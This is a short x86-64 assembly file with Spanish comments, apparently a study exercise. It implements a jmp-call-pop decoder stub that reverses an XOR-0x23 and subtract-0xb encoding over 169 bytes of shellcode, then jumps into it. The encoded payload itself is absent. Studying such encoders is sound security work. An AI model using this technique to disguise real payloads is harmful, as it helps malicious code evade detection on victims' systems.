section .text
    global _start
_start:
    jmp short Funcion0 ;Salta a la etiqueta Funcion0

init:
    pop rsi ;Recupera el valor de la pila y lo coloca en rsi
    ;rsi apuntara al primer byte del shell codificada
    xor rcx, rcx ;Limpiamos rcx a 0
    mov ecx, 0xa9 ;Tamanio de ka shellcode: 169 = 0xa9    

desc:
    xor byte [rsi + rcx - 1], 0x23 ;XOR con 0x23
    sub byte [rsi + rcx - 1], 0xb ;Hacemos la sustracción 0xb al byte actual
    sub ecx, 1 ;Restamos 1 al valor actual de ecx para recorrer todos los bytes
    jnz desc ;Si el resultado previo no es cero, salta de nuevo a desc
    jmp short sc ;Una vez decodificados los valores, salta a sc

Funcion0:
    call init ;Llama a la etiqueta init

sc:
